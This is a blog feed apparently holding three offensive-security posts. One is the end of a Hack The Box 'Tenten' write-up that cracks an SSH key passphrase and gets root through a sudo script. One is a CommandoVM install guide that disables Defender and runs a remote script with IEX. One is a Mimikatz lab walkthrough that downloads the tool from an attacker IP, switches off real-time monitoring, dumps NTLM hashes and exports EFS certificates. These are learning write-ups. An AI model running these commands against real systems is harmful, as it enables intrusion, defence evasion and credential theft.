ctf@014202efa8c8:~/htb/tenten$ /opt/john/run/john --wordlist<span style="color:#ff79c6">=</span>/opt/dictionaries/rockyou.txt ~/htb/tenten/crack.txt
Using default input encoding: UTF-8
Loaded <span style="color:#bd93f9">1</span> password <span style="color:#8be9fd;font-style:italic">hash</span> <span style="color:#ff79c6">(</span>SSH <span style="color:#ff79c6">[</span>RSA/DSA/EC/OPENSSH <span style="color:#ff79c6">(</span>SSH private keys<span style="color:#ff79c6">)</span> 32/64<span style="color:#ff79c6">])</span>
Cost <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">(</span>KDF/cipher <span style="color:#ff79c6">[</span><span style="color:#8be9fd;font-style:italic">0</span><span style="color:#ff79c6">=</span>MD5/AES <span style="color:#8be9fd;font-style:italic">1</span><span style="color:#ff79c6">=</span>MD5/3DES <span style="color:#8be9fd;font-style:italic">2</span><span style="color:#ff79c6">=</span>Bcrypt/AES<span style="color:#ff79c6">])</span> is <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">for</span> all loaded hashes
Cost <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">(</span>iteration count<span style="color:#ff79c6">)</span> is <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">for</span> all loaded hashes
Will run <span style="color:#bd93f9">4</span> OpenMP threads
Press <span style="color:#f1fa8c">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#ff79c6">for</span> status
superpassword    <span style="color:#ff79c6">(</span>id_rsa<span style="color:#ff79c6">)</span>
1g 0:00:00:00 DONE <span style="color:#ff79c6">(</span>2020-09-19 06:56<span style="color:#ff79c6">)</span> 4.000g/s 3120Kp/s 3120Kc/s 3120KC/s superrabbit..supermoose
Use the <span style="color:#f1fa8c">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></td></tr></table>
</div>
</div><p>We can now attempt to login with the private key and passphrase</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/tenten$ chmod <span style="color:#bd93f9">400</span> ./id_rsa
ctf@014202efa8c8:~/htb/tenten$ ssh takis@10.10.10.10 -i ./id_rsa
Enter passphrase <span style="color:#ff79c6">for</span> key <span style="color:#f1fa8c">&#39;./id_rsa&#39;</span>:
Welcome to Ubuntu 16.04.2 LTS <span style="color:#ff79c6">(</span>GNU/Linux 4.4.0-62-generic x86_64<span style="color:#ff79c6">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

<span style="color:#bd93f9">65</span> packages can be updated.
<span style="color:#bd93f9">39</span> updates are security updates.


Last login: Fri May  <span style="color:#bd93f9">5</span> 23:05:36 <span style="color:#bd93f9">2017</span>
takis@tenten:~$ cat user.txt
<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="privilege-escalation">Privilege escalation</h1>
<p>sudo privilege on a dangerous script</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">takis@tenten:~$ sudo -l
Matching Defaults entries <span style="color:#ff79c6">for</span> takis on tenten:
    env_reset, mail_badpass, <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin

User takis may run the following commands on tenten:
    <span style="color:#ff79c6">(</span>ALL : ALL<span style="color:#ff79c6">)</span> ALL
    <span style="color:#ff79c6">(</span>ALL<span style="color:#ff79c6">)</span> NOPASSWD: /bin/fuckin
takis@tenten:~$ file /bin/fuckin
/bin/fuckin: Bourne-Again shell script, ASCII text executable
takis@tenten:~$ cat /bin/fuckin
<span style="color:#6272a4">#!/bin/bash</span>
<span style="color:#8be9fd;font-style:italic">$1</span> <span style="color:#8be9fd;font-style:italic">$2</span> <span style="color:#8be9fd;font-style:italic">$3</span> <span style="color:#8be9fd;font-style:italic">$4</span>
takis@tenten:~$ sudo /bin/fuckin /bin/bash
root@tenten:~# ls ~
user.txt
root@tenten:~# cat /root/root.txt
<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>CommandoVM Preparation</title><link>https://0xade1.github.io/posts/2020/05/commandovm-preparation/</link><pubDate>Tue, 05 May 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/05/commandovm-preparation/</guid><description>prepare your windowsVM Download OVA from https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/ Install French keyboard Windows update Disable Tamper protection from Windows Defender https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-windows-defender-antivirus.html Reboot Snapshot your VM : &amp;ldquo;Before-Commando-VM&amp;rdquo; 1 Set-ExecutionPolicy Unrestricted Install CommandoVM Download and Execute Commander VM by Mandiant 1 IEX(new-object net.webclient).downloadstring(&amp;#39;https://raw.githubusercontent.com/fireeye/commando-vm/master/install.ps1&amp;#39;) Failed to install 1 2 cinst dnSpy.fireeye x64dgb.fireeye proxycap.fireeye metasploit.fireeye amass.docker.fireeye PoshC2.fireeye spiderfoot.docker.fireeye wfuzz.fireeye watson.fireeye PwndPasswordsNTLM.fireeye mimikatz.</description><content type="html"><![CDATA[<h2 id="prepare-your-windowsvm">prepare your windowsVM</h2>
<ul>
<li>Download OVA from <a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/">https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/</a></li>
<li>Install French keyboard</li>
<li>Windows update</li>
<li>Disable Tamper protection from Windows Defender
<ul>
<li><a href="https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-windows-defender-antivirus.html">https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-windows-defender-antivirus.html</a></li>
</ul>
</li>
<li>Reboot</li>
<li>Snapshot your VM : &ldquo;Before-Commando-VM&rdquo;</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">Set-ExecutionPolicy</span> Unrestricted
</code></pre></td></tr></table>
</div>
</div><h2 id="install-commandovm">Install CommandoVM</h2>
<ul>
<li>Download and Execute Commander VM by Mandiant</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">IEX(<span style="color:#8be9fd;font-style:italic">new-object</span> net.webclient).downloadstring(<span style="color:#f1fa8c">&#39;https://raw.githubusercontent.com/fireeye/commando-vm/master/install.ps1&#39;</span>)
</code></pre></td></tr></table>
</div>
</div><h2 id="failed-to-install">Failed to install</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">cinst dnSpy.fireeye x64dgb.fireeye proxycap.fireeye metasploit.fireeye amass.docker.fireeye PoshC2.fireeye spiderfoot.docker.fireeye wfuzz.fireeye watson.fireeye PwndPasswordsNTLM.fireeye mimikatz.fireeye
Directory C:\Users\User\AppData\Local\ChocoCache cannot be removed because it is not empty.
</code></pre></td></tr></table>
</div>
</div><h2 id="successfully-reinstalled-with-cinst">successfully reinstalled with <code>cinst</code></h2>
<pre><code>openvpn
flare-floss.fireeye
fuzzdb.fireeye
dnsrecon.fireeye
ADOffline.fireeye
commandovm.win10.config.fireeye
dnSpy
</code></pre>
<h2 id="troubleshoot-host-only-network-adapter">Troubleshoot host-only network adapter</h2>
<p>We need a second adapter but we can&rsquo;t probe it with nmap because windows marked it as unidentified network
and therefore applies public network firewall rules</p>
<p><a href="https://superuser.com/questions/1160421/how-do-i-force-windows-10-to-see-a-network-as-private">https://superuser.com/questions/1160421/how-do-i-force-windows-10-to-see-a-network-as-private</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">regedit
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles
</code></pre></td></tr></table>
</div>
</div><p>When you find the ProfileName of the network you want to change to Private, double-click on the Category DWORD on the right-hand side:</p>
<ul>
<li>Change the ‘Value data’ from 0 (Public) to 1 (Private):</li>
<li>Close regedit</li>
<li>reboot</li>
</ul>
<h2 id="create-share-folder-between-commandovm-and-external-docker-container">create share Folder between CommandoVM and external Docker container</h2>
<p>Share afolder from commandoVM:</p>
<ul>
<li>deactivate you private network firewall</li>
<li>edit <code>c/windows/system32/drivers/etc/hosts</code> by adding: <code>192.168.99.100 pico</code></li>
<li>create Low privilege user:password</li>
<li>create folder desktop/share</li>
<li>share this folder for your user with R/W permissions</li>
</ul>
<p>from your container connect the commando share folder:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">smbclient //commandovm/share -U simpleuser
</code></pre></td></tr></table>
</div>
</div><p>check you can put/get</p>
<h2 id="credits">Credits</h2>
<pre><code>  _________                                           .___
  \_   ___ \  ____   _____   _____ _____    ____    __| _/____
  /    \  \/ /  _ \ /     \ /     \\__  \  /    \  / __ |/  _ \
  \     \___(  &lt;_&gt; )  Y Y  \  Y Y  \/ __ \|   |  \/ /_/ (  &lt;_&gt; )
   \______  /\____/|__|_|  /__|_|  (____  /___|  /\____ |\____/
          \/             \/      \/     \/     \/      \/
                C O M P L E T E  M A N D I A N T
                     O F F E N S I V E   V M
                          Version 2021.2
                      commandovm@fireeye.com
       _____________________________________________________

                            Created by
                     Jake Barteaux @day1player
                         Mandiant Red Team
                  Blaine Stancill @MalwareMechanic
                            Nhan Huynh
             FireEye Labs Advanced Reverse Engineering
</code></pre>
]]></content></item><item><title>Mimikatz</title><link>https://0xade1.github.io/posts/2020/05/mimikatz/</link><pubDate>Tue, 05 May 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/05/mimikatz/</guid><description>Identification of the processor architecture
1 2 PS C:\users\administrator\Music&amp;gt; $env:PROCESSOR_ARCHITECTURE AMD64 Upload mimikatz
1 2 3 wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200208/mimikatz_trunk.zip unzip mimikatz_trunk.zip -d mimikatz cp mimikatz/x64/mimikatz.exe http/ We download Mimikatz and execute after having disabled Windows Defender
1 2 3 PS C:\users\administrator\Music&amp;gt; iwr -uri http://10.10.14.73:8080/mimikatz.exe -outfile mimikatz.exe PS C:\users\administrator\Music&amp;gt; Set-MpPreference -DisableRealtimeMonitoring $true PS C:\users\administrator\Music&amp;gt; ./mimikatz.exe exit output:
.#####. mimikatz 2.2.0 (x64) #18362 Feb 8 2020 12:26:49 .</description><content type="html"><![CDATA[<p>Identification of the processor architecture</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">PS </span>C:\users\administrator\Music&gt; <span style="color:#8be9fd;font-style:italic">$env:PROCESSOR_ARCHITECTURE</span>
AMD64
</code></pre></td></tr></table>
</div>
</div><p>Upload mimikatz</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200208/mimikatz_trunk.zip
unzip mimikatz_trunk.zip -d mimikatz
cp mimikatz/x64/mimikatz.exe http/
</code></pre></td></tr></table>
</div>
</div><p>We download Mimikatz and execute after having disabled Windows Defender</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">PS </span>C:\users\administrator\Music&gt; <span style="color:#8be9fd;font-style:italic">iwr </span>-uri http://10.10.14.73:8080/mimikatz.exe -outfile mimikatz.exe
<span style="color:#8be9fd;font-style:italic">PS </span>C:\users\administrator\Music&gt; <span style="color:#8be9fd;font-style:italic">Set-MpPreference</span> -DisableRealtimeMonitoring <span style="color:#8be9fd;font-style:italic">$true</span>
<span style="color:#8be9fd;font-style:italic">PS </span>C:\users\administrator\Music&gt; ./mimikatz.exe exit
</code></pre></td></tr></table>
</div>
</div><p>output:</p>
<pre><code>  .#####.   mimikatz 2.2.0 (x64) #18362 Feb  8 2020 12:26:49
 .## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # exit
Bye!
</code></pre>
<p>Grab all users NTLM Hashes</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">PS </span>C:\users\administrator\Music&gt; ./mimikatz.exe <span style="color:#f1fa8c">&#34;token::elevate&#34;</span> <span style="color:#f1fa8c">&#34;lsadump::sam&#34;</span> <span style="color:#f1fa8c">&#34;exit&#34;</span> | <span style="color:#8be9fd;font-style:italic">select-string</span> -pattern <span style="color:#f1fa8c">&#34;Hash NTLM
</span></code></pre></td></tr></table>
</div>
</div><p>output:</p>
<pre><code>Hash NTLM: caf97bbc4c410103485a3cf950496493
Hash NTLM: 275fb2a3ea8b2433976482b69b94497b
Hash NTLM: fa88e03e41fdf7b707979c50d57c06cf
Hash NTLM: 3670611a3c1a68757854520547ab5f24
Hash NTLM: 1916525df2db99ef56a75152807da93d
Hash NTLM: 2b576acbe6bcfda7294d6bd18041b8fe
Hash NTLM: 2b576acbe6bcfda7294d6bd18041b8fe
Hash NTLM: 2b576acbe6bcfda7294d6bd18041b8fe
</code></pre>
<p>We copy on our linux container and extract the hashes</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~/htb$ cat re.mimikatz.ntlm | awk <span style="color:#f1fa8c">&#39;{print $3}&#39;</span> &gt; re.mimikatz.ntlm
</code></pre></td></tr></table>
</div>
</div><p>For speed reason, we can use <a href="https://hashes.org/search.php">hashes.org</a> instead of using hashcat</p>
<pre tabindex="0"><code>fa88e03e41fdf7b707979c50d57c06cf:championship2005
2b576acbe6bcfda7294d6bd18041b8fe:Password123!
2b576acbe6bcfda7294d6bd18041b8fe:Password123!
2b576acbe6bcfda7294d6bd18041b8fe:Password123!
</code></pre><p>Breaking EFS protection that prevents us to read the root.flag, using cipher and mimikatz</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">PS </span>C:\users\administrator\desktop&gt; <span style="color:#8be9fd;font-style:italic">type </span>root.txt
<span style="color:#8be9fd;font-style:italic">PS </span>C:\users\administrator\desktop&gt; <span style="color:#8be9fd;font-style:italic">type </span>: Access to the path <span style="color:#f1fa8c">&#39;C:\users\administrator\desktop\root.txt&#39;</span> is denied.
[..]
<span style="color:#8be9fd;font-style:italic">PS </span>C:\users\administrator\desktop&gt; cipher /c root.txt
</code></pre></td></tr></table>
</div>
</div><p>output:</p>
<pre><code> Listing C:\users\administrator\desktop\
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    RE\Administrator [Administrator(Administrator@RE)]
    Certificate thumbprint: E088 5900 BE20 19BE 6224 E5DE 3D97 E3B4 FD91 C95D

    coby(coby@RE)
    Certificate thumbprint: 415E E454 C45D 576D 59C9 A0C3 9F87 C010 5A82 87E0

  No recovery certificate found.

  Key information cannot be retrieved.
</code></pre>
<p>Administrator and Coby Certificates + Private key will allow to by-pass EFS protection using this <a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files">mimikatz resources</a></p>
<h1 id="getting-the-certificates">Getting the Certificates</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">mimikatz(commandline) # crypto::system /file:C:\users\administrator\Appdata\roaming\Microsoft\Systemcertificates\My\Certificates\E0885900BE2019BE6224E5DE3D97E3B4FD91C95D /export
</code></pre></td></tr></table>
</div>
</div><p>output:</p>
<pre><code>* File: 'C:\users\administrator\Appdata\roaming\Microsoft\Systemcertificates\My\Certificates\E0885900BE2019BE6224E5DE3D97E3B4FD91C95D'
[0045/1] BACKED_UP_PROP_ID
  00
[0019/1] SUBJECT_PUBLIC_KEY_MD5_HASH_PROP_ID
  64c1e91bf384aca6134d11a74189e734
[000f/1] SIGNATURE_HASH_PROP_ID
  1278409eb77c0da719a81c955d1445c24fc3f718
[0003/1] SHA1_HASH_PROP_ID
  e0885900be2019be6224e5de3d97e3b4fd91c95d
[0002/1] KEY_PROV_INFO_PROP_ID
  Provider info:
        Key Container  : b5b62959-b9f9-499a-b76c-d47cac69ff31
        Provider       : Microsoft Enhanced Cryptographic Provider v1.0
        Provider type  : RSA_FULL (1)
        Type           : AT_KEYEXCHANGE (0x00000001)
        Flags          : 00000000
        Param (todo)   : 00000000 / 00000000

[0004/1] MD5_HASH_PROP_ID
  08b0fb10f757f2c03419d3e8176f8d23
